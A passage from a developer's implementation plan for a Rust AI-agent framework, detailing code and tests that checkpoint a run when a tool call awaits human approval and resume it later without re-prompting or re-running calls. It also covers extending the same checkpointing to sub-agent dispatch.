                            );
                        }
                    }
```

(Careful: `call.id` is moved into `results.insert` — clone for `order.push`
first, as shown.)

- [ ] **Step 3: Extract `tool_phase`**

Move the block from `// Phase 1 — gate every call sequentially` through the
`fire_turn_end` `if let Flow::EndRun` block (inclusive) into the new method.
Inputs replace the closed-over locals:
- `parsed.tool_calls` → parameter `tool_calls`
- the invalid seeding loop reads parameter `invalid: Vec<InvalidParked>`
  (construct at the call site:
  `parsed.invalid.iter().map(|i| crate::InvalidParked { id: i.id.clone(), name: i.name.clone(), error: i.error.clone() }).collect()`)
- every `return Ok(())` after a `Done` emit → `return TurnFlow::End(Ok(()))`
- the block's fall-through end → `TurnFlow::Continue`
- `pre: Option<PreDecided>` is accepted and `debug_assert!(pre.is_none())`
  for now (Task 8 consumes it).

At the (single) call site in the turn loop:

```rust
            let invalid: Vec<crate::InvalidParked> = parsed
                .invalid
                .iter()
                .map(|i| crate::InvalidParked {
                    id: i.id.clone(),
                    name: i.name.clone(),
                    error: i.error.clone(),
                })
                .collect();
            match self
                .tool_phase(ctx, &mut *mw_state, run_shared, &cancel, turn,
                    parsed.text.clone(), parsed.tool_calls, invalid, None)
                .await
            {
                TurnFlow::Continue => {}
                TurnFlow::End(r) => return r,
            }
```

Wait — the current code between the assistant-append and Phase 1 also
handles `all_calls.is_empty()` (text-only exit) and post-turn validators use
`turn + 1`; keep the text-only exit in the turn loop (before calling
tool_phase) and pass `turn` through so validator ids stay `validate:{turn+1}:{n}`.
The `parked_index`-relevant `parsed.text` is not needed by tool_phase.

- [ ] **Step 4: Extract `turn_loop`**

`run_with_cancel` keeps its prologue (sandbox-degraded emit, RunStart,
`mw_state`/`run_shared` creation, fire_run_start, set_goal/append,
preserve_thinking) and ends with:

```rust
        self.turn_loop(ctx, &mut mw_state, &run_shared, cancel, 0, preserve_thinking)
            .await
```

`turn_loop` owns `for turn in start_turn..self.config.max_turns { ... }` plus
the budget wrap-up epilogue — moved verbatim (the epilogue references
`cancel` and `preserve_thinking`, both parameters).

- [ ] **Step 5: Run the full agent-core suite**

Run: `cd agent && cargo test -p agent-core`
Expected: ALL existing tests PASS unmodified (this task is a pure reshape;
any assertion change means behavior drifted — stop and fix).

- [ ] **Step 6: Commit**

```bash
git add agent/crates/agent-core/src/loop_.rs
git commit -m "refactor(core): extract tool_phase/turn_loop + NeedsApproval gate outcome (4B-1 prep)"
```

---

### Task 7: Park path — write at Ask, delete on answer, E1 zero-I/O pin

**Files:**
- Modify: `agent/crates/agent-core/src/loop_.rs`
- Test: new inline tests in `loop_.rs` (testkit `ScriptedModel` +
  `RulePolicy` with empty allowlist ⇒ `Decision::Ask`, per the existing
  `approval_summary_includes_sandbox_posture` test's rig)

**Interfaces:**
- Consumes: Tasks 4–6 (`Checkpointer`, `write_park`, `GateRecord`,
  `PendingSnapshot`, `tool_phase`, `PendingAsk`).
- Produces: parking behavior; `tool_phase` gains the records/park logic that
  Task 8's resume consumes.

- [ ] **Step 1: Write the failing tests**

In `loop_.rs` tests (reuse the rig shape of
`approval_summary_includes_sandbox_posture` — `ScriptedModel` scripting one
`execute_command` call, `RulePolicy` with empty allowlist, `CollectingSink`,
tempdir workspace):

```rust
    /// Approval channel that answers `resp` and records how many times it
    /// was asked (the no-double-prompt pins key off this counter).
    struct CountingApproval {
        resp: ApprovalResponse,
        asks: Arc<std::sync::atomic::AtomicUsize>,
        /// park dir observed while blocked (Some ⇒ park existed at ask time)
        parked_at_ask: Arc<Mutex<Option<bool>>>,
        park_dir: PathBuf,
    }
    #[async_trait::async_trait]
    impl ApprovalChannel for CountingApproval {
        async fn request(&self, _req: ApprovalRequest) -> ApprovalResponse {
            self.asks.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
            *self.parked_at_ask.lock().unwrap() =
                Some(crate::checkpoint::has_park(&self.park_dir));
            self.resp
        }
    }

    #[tokio::test]
    async fn ask_parks_before_blocking_and_answer_deletes_the_park() {
        let dir = tempfile::tempdir().unwrap();
        let ck_dir = dir.path().join("checkpoint");
        let ck = crate::Checkpointer::new(ck_dir.clone(), [7u8; 32], "s1".into());
        let asks = Arc::new(std::sync::atomic::AtomicUsize::new(0));
        let parked_at_ask = Arc::new(Mutex::new(None));
        let approval = Arc::new(CountingApproval {
            resp: ApprovalResponse::Approve,
            asks: asks.clone(),
            parked_at_ask: parked_at_ask.clone(),
            park_dir: ck_dir.clone(),
        });
        // rig: ScriptedModel [Call execute_command {"command":"echo hi"}, Text "Done."],
        // RulePolicy empty allowlist, registry with ExecuteCommand,
        // CollectingSink, workspace = dir — copy the posture test's setup.
        let agent = /* AgentLoop::new(...) as in the posture test */
            .with_checkpointer(ck.clone());
        // MUST be CuratedContext (plan review finding 5): the park write is
        // gated on ctx.checkpoint_state() being Some — WindowContext would
        // silently skip the park and the test could never pass.
        let mut ctx = crate::CuratedContext::new(
            Message::system("s".into()),
            Arc::new(crate::SessionArtifacts::new()),
            Arc::new(std::sync::atomic::AtomicBool::new(false)),
        );
        agent.run(&mut ctx, "go".into()).await.unwrap();
        // park existed WHILE the ask was pending (spec §2.3: write BEFORE block)…
        assert_eq!(*parked_at_ask.lock().unwrap(), Some(true));
        // …and the answer deleted it before the run proceeded (commit point)
        assert!(!crate::checkpoint::has_park(&ck_dir));
        assert_eq!(asks.load(std::sync::atomic::Ordering::SeqCst), 1);
    }

    #[tokio::test]
    async fn deny_also_deletes_the_park() {
        // same rig with resp: ApprovalResponse::Deny
        // after run: !has_park(&ck_dir)
    }

    #[tokio::test]
    async fn non_ask_runs_write_zero_checkpoint_bytes() {
        // rig: AllowAll policy (or allowlist containing the command) so
        // check() == Allow; checkpointer wired.
        // after run: assert!(!ck_dir.exists(), "E1: no checkpoint I/O at all");
    }

    #[tokio::test]
    async fn park_checkpoint_carries_context_records_and_parked_index() {
        // rig: CuratedContext (not WindowContext) so checkpoint_state() is
        // Some; script TWO calls in one turn: first "read_file" (policy
        // Allow via a policy that allows read_file and Asks execute_command),
        // second execute_command (Ask). Approval channel: capture-then-Deny
        // that ALSO load_checkpoint()s the dir while blocked and stashes it.
        // Assert on the stashed checkpoint:
        //   parked.parked_index == Some(1)
        //   parked.gate_records == vec![GateRecord::Ready]
        //   parked.tool_calls.len() == 2
        //   context.history.last() is the assistant message (batch appended pre-gate)
        //   guardrails.model_calls >= 1 when a counting middleware is stacked
        //   session_id == "s1"
    }

    #[tokio::test]
    async fn checkpoint_write_failure_degrades_to_live_only() {
        // point the Checkpointer at an impossible dir (a FILE at the dir
        // path: std::fs::write(&ck_path, "x")); Ask + Approve.
        // Run must complete normally (tool executes); no panic, no error
        // return — spec §2.3 "never block the run on checkpoint I/O".
    }
```

Write the three sketched tests out fully — copy the first test's rig and
vary policy/approval; the comments above are the assertions, not
placeholders to leave.

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd agent && cargo test -p agent-core park`
Expected: FAIL — `parked_at_ask == Some(false)` / dir assertions fail (no
park logic yet). (`has_park` needs `pub` visibility via
`crate::checkpoint::has_park` — already public from Task 4.)

- [ ] **Step 3: Implement the park write in `tool_phase`**

At the top of `tool_phase`, prepare the (memory-only) park inputs:

```rust
        // Park-support state (E1: pure memory unless an Ask actually parks;
        // None checkpointer ⇒ every branch below is a no-op).
        let batch_for_park: Option<Vec<ToolCall>> =
            self.checkpointer.as_ref().map(|_| tool_calls.clone());
        let mut records: Vec<crate::GateRecord> = Vec::new();
```

In the Phase-1 loop, append to `records` in each arm:
- `Ready` arm (and post-approval allowed): `records.push(crate::GateRecord::Ready);`
- `Rejected` arm (and post-approval denied): `records.push(crate::GateRecord::Rejected { content: content.clone() });`
  (in the denied arm the content is the `format!("ERROR: {}", ...)` string —
  push the same value inserted into `results`).

In the `NeedsApproval` arm, BEFORE the emit+await added in Task 6:

```rust
                        // Park BEFORE blocking (spec §2.3). Write failure
                        // degrades to live-only — log + event, never block.
                        if let (Some(ck), Some(batch)) =
                            (self.checkpointer.as_ref(), batch_for_park.as_ref())
                        {
                            if let Some(state) = ctx.checkpoint_state() {
                                let idx = records.len();
                                let chk = crate::Checkpoint {
                                    version: crate::CHECKPOINT_VERSION,
                                    session_id: ck.session_id().to_string(),
                                    subagent_path: ck.subagent_path().to_vec(),
                                    turn: turn as u64,
                                    context: state,
                                    guardrails: crate::Guardrails {
                                        tool_calls: run_shared
                                            .with::<crate::ToolCallCount, _>(|c| c.0)
                                            as u64,
                                        model_calls: run_shared
                                            .with::<crate::ModelCallCount, _>(|c| c.0)
                                            as u64,
                                    },
                                    parked: crate::ParkedTurn {
                                        assistant_text: assistant_text.clone(),
                                        tool_calls: batch.clone(),
                                        invalid: invalid_for_park.clone(),
                                        gate_records: records.clone(),
                                        parked_index: Some(idx),
                                        origin: ck.origin().cloned(),
                                    },
                                };
                                if let Err(e) = ck.write_park(chk, &self.artifacts_for_park()).await {
                                    tracing::warn!(target: "checkpoint", error = %e,
                                        "park write failed; approval is live-only this ask");
                                    self.sink.emit(AgentEvent::Error(format!(
                                        "checkpoint write failed (approval not durable): {e}"
                                    )));
                                }
                            }
                        }
```

Two wiring details this snippet surfaces — resolve them like this:

1. **`invalid_for_park`**: the `invalid` parameter is consumed by the
   seeding loop at the top of `tool_phase`. Change the seeding loop to
   iterate by reference and keep `invalid` alive; use it directly
   (`invalid.clone()`), dropping the `invalid_for_park` name.
2. **`artifacts_for_park`**: the loop does not hold `SessionArtifacts` — the
   CONTEXT does (`CuratedContext.artifacts`, `pub(crate)`). Rather than
   plumb a new field through `AgentLoop`, extend `PendingSnapshot`-style
   access: add to `ContextManager` a defaulted
   `fn artifacts(&self) -> Option<Arc<crate::SessionArtifacts>> { None }`,
   overridden by `CuratedContext` to return `Some(self.artifacts.clone())`;
   the park write uses
   `ctx.artifacts().unwrap_or_else(|| Arc::new(crate::SessionArtifacts::new()))`.
   (An empty dump for non-curated contexts is correct — they have no stores.)

After the `tokio::select!` resolves (both allowed and denied outcomes),
commit the answer:

```rust
                        // Answer commit (spec §2.3): delete the park before
                        // proceeding. Auto-deny (E5 knob) and cancel-deny
                        // commit the same way.
                        if let Some(ck) = self.checkpointer.as_ref() {
                            ck.clear_park();
                        }
```

- [ ] **Step 4: Pre-Phase-2 ancestor snapshot + turn-end clear**

Immediately BEFORE the Phase-2 `futures::stream::iter(...)` block in
`tool_phase` (dispatch-bearing turns only — header note 4):

```rust
        // Ancestor snapshot (spec §2.5, header note 4): memory-only; flushed
        // to disk only if a descendant parks. Dispatch-bearing turns only.
        if let Some(ck) = self.checkpointer.as_ref() {
            if ready.iter().any(|rc| rc.name == "dispatch_agent") {
                if let Some(state) = ctx.checkpoint_state() {
                    ck.set_turn_snapshot(crate::PendingSnapshot {
                        context: state,
                        guardrails: crate::Guardrails {
                            tool_calls: run_shared.with::<crate::ToolCallCount, _>(|c| c.0) as u64,
                            model_calls: run_shared.with::<crate::ModelCallCount, _>(|c| c.0) as u64,
                        },
                        turn: turn as u64,
                        assistant_text: assistant_text.clone(),
                        tool_calls: batch_for_park.clone().unwrap_or_default(),
                        invalid: invalid.clone(),
                        gate_records: records.clone(),
                        artifacts: ctx
                            .artifacts()
                            .unwrap_or_else(|| Arc::new(crate::SessionArtifacts::new())),
                    });
                }
            }
        }
```

At **every exit** of `tool_phase` — not just the `Continue` fall-through
(plan review finding 2: the two `fire_after_tools`/`fire_turn_end`
`TurnFlow::End` returns would otherwise leak a stale dispatch-kind park,
which a later scan would misread as a phantom parked session). Structure the
tail of `tool_phase` so a single `end_turn` covers all exits:

```rust
        // …fire_after_tools / fire_turn_end blocks compute `flow` into a
        // local instead of returning inline…
        let out = match flow_after_tools_or_turn_end {
            crate::Flow::EndRun(reason) => {
                self.sink.emit(AgentEvent::Done(reason));
                TurnFlow::End(Ok(()))
            }
            _ => TurnFlow::Continue,
        };
        // Turn over either way: drop the memory snapshot; remove a
        // dispatch-kind park if a child flushed it this turn (all children
        // finished — Phase 2 drained). Zero I/O unless a flush happened.
        if let Some(ck) = self.checkpointer.as_ref() {
            ck.end_turn();
        }
        out
```

(Implement by restructuring the two hook blocks to fall through to this
shared tail rather than `return`ing — the earlier Phase-1/2 exits in the
moved region are Done-emitting run terminations that occur BEFORE any
snapshot is set this turn, so they stay early returns; only the two
post-Phase-2 hook exits need the shared tail. Verify with a test: child
parks and is answered live, then a `ToolCallLimit`-style middleware ends the
run at turn end — assert no dispatch-kind park remains on disk.)

- [ ] **Step 5: Run tests to verify they pass**

Run: `cd agent && cargo test -p agent-core`
Expected: Task-7 tests PASS; full suite PASS (non-checkpointer runs
untouched).

- [ ] **Step 6: Commit**

```bash
git add agent/crates/agent-core/src/loop_.rs agent/crates/agent-core/src/context.rs agent/crates/agent-core/src/curated.rs
git commit -m "feat(core): park-point checkpoint write at gate Ask + answer-commit deletion (4B-1, E1)"
```

---

### Task 8: Resume entry — `resume_with_cancel` + pre-decided gate splice

**Files:**
- Modify: `agent/crates/agent-core/src/loop_.rs`,
  `agent/crates/agent-core/src/lib.rs` (re-export `ResumeTurn`)
- Test: inline tests in `loop_.rs`

**Interfaces:**
- Consumes: Tasks 6–7 (`tool_phase(pre)`, `turn_loop(start_turn)`,
  `PreDecided`).
- Produces (Tasks 9, 12 rely on):

```rust
/// Everything needed to re-enter a checkpointed turn. Built by the caller
/// (dispatch for children, the server coordinator for the root) from a
/// verified Checkpoint — the loop never reads checkpoint files itself.
pub struct ResumeTurn {
    pub assistant_text: String,
    pub tool_calls: Vec<ToolCall>,
    pub invalid: Vec<crate::InvalidParked>,
    pub gate_records: Vec<crate::GateRecord>,
    /// Some(i) = gate-kind (re-ask or consume `parked_decision` at i);
    /// None = dispatch-kind (whole batch pre-decided; re-enter Phase 2).
    pub parked_index: Option<usize>,
    /// Some(_) when a durable answer.json committed a decision (E2 note:
    /// an ApproveAlways answered pre-restart arrives as plain approve=true).
    pub parked_decision: Option<bool>,
    pub turn: u64,
    pub guardrails: crate::Guardrails,
    /// Goal text handed to fire_run_start (memory recall etc.); from the
    /// restored context's goal, or empty.
    pub goal_text: String,
}

impl AgentLoop {
    pub async fn resume_with_cancel(
        &self,
        ctx: &mut dyn ContextManager,   // ALREADY restored by the caller
        resume: ResumeTurn,
        cancel: CancellationToken,
    ) -> Result<(), AgentError>;
}

impl crate::Checkpoint {
    /// The mechanical Checkpoint→ResumeTurn projection (decision injected
    /// separately by the caller).
    pub fn resume_turn(&self, parked_decision: Option<bool>) -> ResumeTurn;
}
```

- [ ] **Step 1: Write the failing tests**

```rust
    #[tokio::test]
    async fn resume_splices_records_without_reprompting_and_executes_phase2() {
        // Rig: registry with ExecuteCommand; policy that ASKS for
        // execute_command; CountingApproval{resp: Approve} — the mutation
        // pin: asks MUST stay 0 (an implementation that re-gates decided
        // calls re-prompts and fails here; spec §3.7).
        // ScriptedModel: [Text "wrapped up"] — the RESUMED turn consumes no
        // completion; the model only serves the turn AFTER the batch.
        // Build ctx: CuratedContext::restore from a state whose history ends
        // with an assistant message carrying the 2-call batch
        // [echo one (Ready), echo two (parked, decision approve=true)].
        let resume = ResumeTurn {
            assistant_text: "running the batch".into(),
            tool_calls: vec![
                ToolCall { id: "c1".into(), name: "execute_command".into(),
                    args: serde_json::json!({"command": "echo one"}) },
                ToolCall { id: "c2".into(), name: "execute_command".into(),
                    args: serde_json::json!({"command": "echo two"}) },
            ],
            invalid: vec![],
            gate_records: vec![crate::GateRecord::Ready],
            parked_index: Some(1),
            parked_decision: Some(true),
            turn: 3,
            guardrails: crate::Guardrails { tool_calls: 5, model_calls: 4 },
            goal_text: "the goal".into(),
        };
        agent.resume_with_cancel(&mut ctx, resume, CancellationToken::new())
            .await.unwrap();
        assert_eq!(asks.load(Ordering::SeqCst), 0, "no re-prompt (spec §3.7)");
        // both calls executed exactly once: two ToolResult events with
        // status Ok for c1 and c2 in the sink
        // and the run then finished on the scripted text turn: Done(Stop)
    }

    #[tokio::test]
    async fn resumed_denial_yields_denied_result_without_prompt() {
        // same rig, parked_decision: Some(false):
        // c2's ToolResult status == Denied, content contains "user declined";
        // asks == 0.
    }

    #[tokio::test]
    async fn resume_without_decision_reasks_live_and_can_park_again() {
        // same rig, parked_decision: None, CountingApproval{resp: Approve},
        // checkpointer wired: asks == 1 (the parked ask re-prompts live);
        // parked_at_ask == Some(true) (a park was re-written before the
        // block); after the run, no park remains.
    }

    #[tokio::test]
    async fn guardrail_tallies_survive_resume_without_refill() {
        // stack ToolCallLimit-style counting middleware; resume with
        // guardrails.tool_calls = TOOL_CALL_LIMIT - 1. After the resumed
        // batch (2 calls) the pre-turn backstop must trip on the NEXT turn:
        // the run ends with the tool-call guardrail error, proving the
        // budget did not refill (spec §3.8).
    }

    #[tokio::test]
    async fn dispatch_kind_resume_lost_results_non_dispatch_siblings() {
        // P1 pin: parked_index None, gate_records [Ready, Ready] over a
        // 2-call batch [execute_command "echo side-effect", dispatch_agent].
        // The execute_command must NOT run (no side-effect replay): its
        // ToolResult is status Error containing "result lost across daemon
        // restart", and the workspace shows no trace of the command. The
        // dispatch_agent call DOES gate through gate_preapproved and
        // executes (rig its child as a trivial scripted loop). No prompts.
    }
```

Flesh each sketched test out fully against the Task-7 rig helpers.

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd agent && cargo test -p agent-core resume`
Expected: COMPILE ERROR — `ResumeTurn`/`resume_with_cancel` not found.

- [ ] **Step 3: Implement `PreDecided` consumption in `tool_phase`**

Replace Task 6's `debug_assert!(pre.is_none())`. In the Phase-1 loop,
consult `pre` by index before gating:

```rust
            for (idx, call) in tool_calls.into_iter().enumerate() {
                let outcome = match pre.as_ref() {
                    // P1 (owner 2026-07-10): on a dispatch-kind resume, a
                    // Ready NON-dispatch sibling must not re-execute — its
                    // pre-crash side effects persist on the host. Synthetic
                    // lost-result instead; the model re-runs it if needed.
                    Some(p) if p.dispatch_kind
                        && idx < p.records.len()
                        && matches!(p.records[idx], crate::GateRecord::Ready)
                        && call.name != "dispatch_agent" =>
                    {
                        self.sink.emit(AgentEvent::ToolStart {
                            id: call.id.clone(),
                            name: call.name.clone(),
                            args: call.args.clone(),
                            parent_id: None,
                        });
                        order.push(call.id.clone());
                        results.insert(
                            call.id,
                            (
                                call.name,
                                Resolved::Err {
                                    status: ToolStatus::Error,
                                    content: "ERROR: result lost across daemon \
                                              restart — re-run this call if it is \
                                              still needed"
                                        .into(),
                                    duration_ms: 0,
                                },
                            ),
                        );
                        records.push(crate::GateRecord::Rejected {
                            content: "ERROR: result lost across daemon restart".into(),
                        });
                        continue;
                    }
                    Some(p) if idx < p.records.len() => match &p.records[idx] {
                        crate::GateRecord::Rejected { content } => {
                            // replay the decided rejection (ToolStart still
                            // emitted so every call keeps its event pair)
                            self.sink.emit(AgentEvent::ToolStart {
                                id: call.id.clone(),
                                name: call.name.clone(),
                                args: call.args.clone(),
                                parent_id: None,
                            });
                            GateOutcome::Rejected {
                                id: call.id,
                                name: call.name,
                                content: content.clone(),
                            }
                        }
                        crate::GateRecord::Ready => self.gate_preapproved(call, &cancel),
                    },
                    Some(p) if idx == p.parked_index && p.parked_decision.is_some() => {
                        // the answered parked ask: consume the committed
                        // decision — never re-prompt (spec §2.4 step 6).
                        // CONSUME-TIME COMMIT (plan review BLOCKER 1 /
                        // header note 3): delete the park + answer NOW,
                        // before anything executes — a crash after this
                        // point loses the run from here (D1), it never
                        // re-prompts an already-consumed approval, so the
                        // approved call can never execute twice.
                        if let Some(ck) = self.checkpointer.as_ref() {
                            ck.clear_park();
                        }
                        let approve = p.parked_decision.unwrap();
                        self.sink.emit(AgentEvent::ToolStart {
                            id: call.id.clone(),
                            name: call.name.clone(),
                            args: call.args.clone(),
                            parent_id: None,
                        });
                        if approve {
                            self.gate_preapproved(call, &cancel)
                        } else {
                            GateOutcome::Rejected {
                                id: call.id,
                                name: call.name,
                                content: format!(
                                    "ERROR: {}",
                                    ToolError::Denied("user declined".into())
                                ),
                            }
                        }
                    }
                    // past the pre-decided prefix (or unanswered parked ask):
                    // gate normally — a later Ask parks again (spec §2.4)
                    _ => self.gate_tool(call, &cancel).await,
                };
                // ...existing three-arm match on `outcome` (Task 6/7),
                //    including records.push(...) bookkeeping...
            }
```

`gate_preapproved` = `gate_tool` minus policy/approval (tool resolve +
intent may still fail after a config change — those become honest errors):

```rust
    /// Rebuild a ReadyCall for a call whose gate outcome was already decided
    /// (resume splice). No policy check, no prompt — the decision is reused
    /// (spec §3.7); resolution/intent failures surface as normal errors.
    fn gate_preapproved(&self, call: ToolCall, cancel: &CancellationToken) -> GateOutcome {
        let tool = match self.tools.get(&call.name) {
            Some(t) => t,
            None => {
                return GateOutcome::Rejected {
                    id: call.id,
                    name: call.name.clone(),
                    content: format!(
                        "ERROR: {}",
                        ToolError::NotFound(format!(
                            "unknown tool {} (removed since this run parked)",
                            call.name
                        ))
                    ),
                }
            }
        };
        let access = match tool.intent(&call.args) {
            Ok(i) => i.access,
            Err(e) => {
                return GateOutcome::Rejected {
                    id: call.id,
                    name: call.name,
                    content: format!("ERROR: {e}"),
                }
            }
        };
        GateOutcome::Ready(self.ready_call(tool, call, access, cancel))
    }
```

NOTE (double-emit guard): `gate_tool` and `gate_preapproved` both emit
`ToolStart`… `gate_tool` emits at entry, so the two pre-decided arms above
must NOT also emit before calling `gate_preapproved`. Fix the snippet while
implementing: emit ToolStart inside `gate_preapproved` (mirroring
`gate_tool`) and DELETE the explicit emits in the `Ready`/decision arms —
keep exactly one ToolStart per call (the Rejected-replay arm keeps its
explicit emit since no gate function runs). Pin it in the splice test:
exactly one ToolStart per call id.

- [ ] **Step 4: Implement `resume_with_cancel` + `Checkpoint::resume_turn`**

```rust
    /// Re-enter a parked run (spec §2.4 step 6). `ctx` is already restored;
    /// this replays the checkpointed turn's gate outcomes (no model call, no
    /// re-prompt for decided calls), executes Phase 2 fresh, then continues
    /// as a normal run.
    pub async fn resume_with_cancel(
        &self,
        ctx: &mut dyn ContextManager,
        resume: ResumeTurn,
        cancel: CancellationToken,
    ) -> Result<(), AgentError> {
        let d = self.sandbox_descriptor();
        if let Some(reason) = d.degraded {
            self.sink.emit(AgentEvent::SandboxDegraded { mechanism: d.mechanism, reason });
        }
        let mut mw_state = crate::RunState::default();
        let run_shared = crate::RunShared::default();
        // Tallies survive restart (spec §3.8): seed, never refill. The
        // monotonic clamp against restored history ran at load time
        // (caller side); here the values are trusted-verified.
        run_shared.with::<crate::ToolCallCount, _>(|c| c.0 = resume.guardrails.tool_calls as usize);
        run_shared.with::<crate::ModelCallCount, _>(|c| c.0 = resume.guardrails.model_calls as usize);
        // run_start hooks fire (memory index re-load, curation setup); a
        // middleware EndRun is honored exactly as on a fresh run.
        let flow = self
            .fire_run_start(ctx, &mut mw_state, &cancel, &resume.goal_text, &run_shared)
            .await;
        if let crate::Flow::EndRun(reason) = flow {
            self.sink.emit(AgentEvent::Done(reason));
            return Ok(());
        }
        // NO set_goal / NO user append — history is restored, goal pinned.
        let preserve_thinking =
            self.config.preserve_thinking || !self.tools.schemas().is_empty();
        let start_turn = resume.turn as usize;
        // Dispatch-kind commit point (plan review finding 1c): the whole
        // batch is pre-decided and about to execute — delete the stale park
        // NOW. A crash from here loses the run (D1), it never replays the
        // batch. Gate-kind parks are NOT cleared here: an answered ask
        // clears at consume (inside tool_phase); an unanswered one keeps its
        // park and rewrites it when the live re-ask parks again.
        if resume.parked_index.is_none() {
            if let Some(ck) = self.checkpointer.as_ref() {
                ck.clear_park();
            }
        }
        let pre = PreDecided {
            records: resume.gate_records,
            dispatch_kind: resume.parked_index.is_none(),
            parked_index: resume.parked_index.unwrap_or(usize::MAX),
            parked_decision: resume.parked_decision,
        };
        match self
            .tool_phase(ctx, &mut mw_state, &run_shared, &cancel, start_turn,
                resume.assistant_text, resume.tool_calls, resume.invalid, Some(pre))
            .await
        {
            TurnFlow::End(r) => return r,
            TurnFlow::Continue => {}
        }
        if start_turn + 1 >= self.config.max_turns {
            // parked on the final turn: fall through to the wrap-up path
        }
        self.turn_loop(ctx, &mut mw_state, &run_shared, cancel, start_turn + 1, preserve_thinking)
            .await
    }
```

(`turn_loop(start_turn+1)` with `start_turn+1 >= max_turns` runs zero turns
and lands in the budget wrap-up epilogue — exactly right; delete the empty
`if` once verified.)

```rust
impl Checkpoint {
    pub fn resume_turn(&self, parked_decision: Option<bool>) -> ResumeTurn {
        ResumeTurn {
            assistant_text: self.parked.assistant_text.clone(),
            tool_calls: self.parked.tool_calls.clone(),
            invalid: self.parked.invalid.clone(),
            gate_records: self.parked.gate_records.clone(),
            parked_index: self.parked.parked_index,
            parked_decision,
            turn: self.turn,
            guardrails: self.guardrails,
            goal_text: self
                .context
                .goal
                .as_ref()
                .map(|g| g.content.clone())
                .unwrap_or_default(),
        }
    }
}
```

Also add the load-time clamp helper in `checkpoint.rs` (used by dispatch +
server; header note 6):

```rust
/// Monotonic tally clamp (spec §2.4 step 3): the restored tally may never
/// be below what the checkpointed history implies. Implied floor = executed
/// tool results after the last user message (this run's earlier turns).
pub fn verify_tally_floor(chk: &Checkpoint) -> Result<(), CheckpointError> {
    let last_user = chk
        .context
        .history
        .iter()
        .rposition(|m| m.role == agent_model::Role::User);
    let implied = chk.context.history[last_user.map_or(0, |i| i + 1)..]
        .iter()
        .filter(|m| m.role == agent_model::Role::Tool)
        .count() as u64;
    if chk.guardrails.tool_calls < implied {
        return Err(CheckpointError::Corrupt(format!(
            "tool tally {} below history-implied floor {implied}",
            chk.guardrails.tool_calls
        )));
    }
    Ok(())
}
```

(Check the real `Role` variant names at source — `Role::User`/`Role::Tool`
by content. Add a unit test in checkpoint.rs: tally below floor ⇒ Corrupt;
tally at/above floor ⇒ Ok. Note the Rejected/invalid results in history also
count Role::Tool — they never over-floor because rejections were still
gate outcomes this run; an over-strict floor errs toward refuse, which is
the fail-safe direction.)

- [ ] **Step 5: Run tests to verify they pass**

Run: `cd agent && cargo test -p agent-core`
Expected: all resume + park + existing tests PASS.

- [ ] **Step 6: Commit**

```bash
git add agent/crates/agent-core/src/loop_.rs agent/crates/agent-core/src/checkpoint.rs agent/crates/agent-core/src/lib.rs
git commit -m "feat(core): resume_with_cancel — gate-record splice, tally seeding, re-park (4B-1)"
```

---

### Task 9: Dispatch — child checkpointers, attribution, resume rebinding

**Files:**
- Modify: `agent/crates/agent-core/src/dispatch.rs`,
  `agent/crates/agent-runtime-config/src/assemble.rs` (DispatchDeps
  construction gains `checkpoint: None` — find by content
  `DispatchDeps {`), any test rigs constructing `DispatchDeps`
- Test: inline tests in `dispatch.rs`

**Interfaces:**
- Consumes: Tasks 2, 5, 8.
- Produces: `DispatchDeps.checkpoint: Option<Arc<Checkpointer>>` (Task 11
  wires it from assemble).

- [ ] **Step 1: Write the failing tests**

In `dispatch.rs` tests (reuse the existing dispatch rig — the deps builder
near `subagent_timeout: Duration::from_secs(600)`):

```rust
    #[tokio::test]
    async fn child_ask_carries_origin_and_parks_under_children_dir() {
        // deps.checkpoint = Some(Checkpointer::new(ckdir, key, "s1"));
        // deps.approval = capture channel recording req.origin;
        // child ScriptedModel issues an execute_command; child policy Asks.
        // Approval answers Deny (run completes).
        // Assert: captured origin == Some(ApprovalOrigin{
        //   delegation_id: <the dispatch call id>, subagent_name:
        //   "general-purpose", depth: 1 });
        // While blocked, the capture channel stats the fs:
        //   has_park(ckdir/children/<call_id>) was true at ask time;
        //   has_park(ckdir) was true too (ancestor dispatch-kind flush).
        // After the dispatch returns: child dir cleared (clear_child) and
        //   parent park gone after turn end.
    }

    #[tokio::test]
    async fn parent_ask_has_no_origin() {
        // top-level loop (no dispatch): captured req.origin.is_none()
        // — parent approvals unchanged in shape (spec §2.6).
    }

    #[tokio::test]
    async fn dispatch_rebinds_a_parked_child_and_resumes_in_place() {
        // Arrange a PRE-EXISTING child checkpoint on disk (write_checkpoint
        // under ckdir/children/<call_id> with a 1-call parked batch, an
        // answer.json approve=true) keyed by the call id the rig will use.
        // Child ScriptedModel: [Text "done"] — the resumed child consumes
        // NO completion for the parked turn (execution first, then text).
        // Dispatch with deps.checkpoint wired; assert:
        //   - the child's parked command EXECUTED (ToolResult in the sink);
        //   - no approval prompt fired (asks == 0);
        //   - dispatch result content contains the child's final text;
        //   - the child checkpoint dir is deleted afterward.
    }

    #[tokio::test]
    async fn dispatch_deadline_disarms_while_child_ask_is_parked() {
        // P2 pin: deps.checkpoint wired; subagent_timeout tiny (e.g. 50ms
        // via the rig's loop_config/subagent_timeout); child parks at an
        // Ask whose approval channel resolves only after 5× the deadline
        // (a delayed-approve channel using tokio::time::sleep). The
        // dispatch must NOT time out: after the late approve, the child
        // completes and the dispatch returns its text. A control variant
        // WITHOUT deps.checkpoint (live-only ask) still times out — pins
        // that the disarm is scoped to durable asks.
    }

    #[tokio::test]
    async fn corrupt_child_checkpoint_refuses_honestly() {
        // Tamper the pre-existing child parked.json; dispatch must return a
        // failure output mentioning the checkpoint (never silently start a
        // fresh child over it — spec §4), and the tampered dir is retained.
    }
```

Write these out fully against the real rig helpers in dispatch.rs's test
module (locate by content; the rigs already build deps + registry + sinks).

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd agent && cargo test -p agent-core dispatch`
Expected: COMPILE ERROR — `checkpoint` field not found on `DispatchDeps`.

- [ ] **Step 3: Implement**

`DispatchDeps` gains (after `memories`):

```rust
    /// Parent loop's checkpointer; None ⇒ children are not durable (test
    /// rigs, CLI in 4B-1). Children derive their own via `.child()`.
    pub checkpoint: Option<Arc<crate::Checkpointer>>,
```

In `execute`, after `let parent_id = format!(...)` (locate by content):

```rust
        let origin = agent_policy::ApprovalOrigin {
            delegation_id: parent_id.clone(),
            subagent_name: subagent_type.clone(),
            depth: self.deps.depth,
        };
        let child_ckpt = self
            .deps
            .checkpoint
            .as_ref()
